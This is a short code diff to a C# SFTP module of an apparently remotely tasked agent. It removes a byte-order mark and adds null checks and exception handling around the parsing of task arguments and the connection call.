@@ -1,4 +1,4 @@
-﻿using Agent.Interfaces;
+using Agent.Interfaces;
 using Agent.Models;
 using Agent;
 using System;
@@ -107,8 +107,20 @@ namespace sftp
         }
         public async Task Execute(ServerJob job)
         {
-            SftpArgs args = JsonSerializer.Deserialize<SftpArgs>(job.task.parameters);
-            await Connect(job.task.id, args, job.cancellationtokensource.Token);
+            try
+            {
+                SftpArgs? args = JsonSerializer.Deserialize<SftpArgs>(job.task.parameters);
+                if (args is null)
+                {
+                    ReturnOutput("Failed to parse arguments.", job.task.id);
+                    return;
+                }
+                await Connect(job.task.id, args, job.cancellationtokensource.Token).ConfigureAwait(false);
+            }
+            catch (Exception ex)
+            {
+                ReturnOutput($"SFTP error: {ex.Message}", job.task.id);
+            }
         }
 
         public void Interact(InteractMessage message)
